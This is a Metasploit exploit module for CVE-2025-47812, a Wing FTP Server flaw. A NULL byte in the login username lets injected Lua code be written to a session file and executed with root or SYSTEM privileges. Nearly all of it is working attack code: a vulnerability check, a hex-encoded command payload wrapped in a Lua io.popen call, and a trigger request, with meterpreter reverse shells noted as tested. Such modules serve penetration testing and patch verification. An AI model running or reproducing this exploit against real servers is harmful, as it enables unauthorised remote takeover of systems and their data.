##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wing FTP Server NULL-byte Authentication Bypass (CVE-2025-47812)',
        'Description' => %q{
          Wing FTP Server allows arbitrary Lua code injection via a NULL-byte (%00) truncation bug (CVE-2025-47812).
          Supplying <valid-user>%00<lua-payload> as the username makes the C++ authentication routine validate only the prefix,
          while the full string is written unfiltered into the session file and later executed with root/SYSTEM privileges,
          leading to Remote Code Execution.
        },
        'Author' => [
          'Valentin Lobstein',   # Metasploit Module
          'Julien Ahrens'        # Vulnerability Discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-47812'],
          ['URL', 'https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/']
        ],
        'Platform' => %w[unix linux win],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command Shell', {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell', {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Privileged' => true,
        'DisclosureDate' => '2025-06-30',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'Valid username for authentication', 'anonymous' ]),
        OptString.new('PASSWORD', [ false, 'Password for authentication', '' ])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.html')
    )
    return CheckCode::Safe('Not a Wing FTP Web Client') unless res&.body&.include?('Wing FTP Server - Web Client')

    suffix = Rex::Text.rand_text_alpha(8)
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    payload = "username=#{user}%00#{suffix}&password=#{pass}&username_val=#{user}&password_val=#{pass}"

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'loginok.html'),
      'headers' => {
        'Content-Type' => 'application/x-www-form-urlencoded',
        'Referer' => normalize_uri(target_uri.path, 'login.html') + '?lang=english'
      },
      'data' => payload
    )
    return CheckCode::Unknown('No response') unless res

    uid = res.get_cookies_parsed.fetch('UID', nil)
    return CheckCode::Appears("UID cookie received: #{uid}") if uid

    CheckCode::Safe('UID cookie not found; not vulnerable')
  end

  def exploit
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    hex = payload.encoded.unpack('H*').first

    lua = <<~LUA
      ]]
      local function hx(s)#{' '}
        return (s:gsub('..', function(x)#{' '}
          return string.char(tonumber(x,16))#{' '}
        end))#{' '}
      end
      local cmd = hx("#{hex}")
      local h = io.popen(cmd)
      local r = h:read("*a")
      h:close()
    LUA

    inj = "#{user}%00" + Rex::Text.uri_encode(lua).gsub('%0a', '%0d') + '--'

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'loginok.html'),
      'headers' => {
        'Referer' => normalize_uri(target_uri.path, 'login.html') + '?lang=english'
      },
      'vars_post' => {
        'username' => inj,
        'password' => pass,
        'username_val' => user,
        'password_val' => pass
      }
    )
    fail_with(Failure::UnexpectedReply, 'Injection failed') unless res&.code == 200

    uid = res.get_cookies_parsed.fetch('UID', nil)
    fail_with(Failure::UnexpectedReply, 'UID cookie not returned') unless uid
    print_good("Received UID: #{uid}, injection succeeded")

    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'dir.html'),
      'headers' => { 'Cookie' => uid }
    )
  end
end
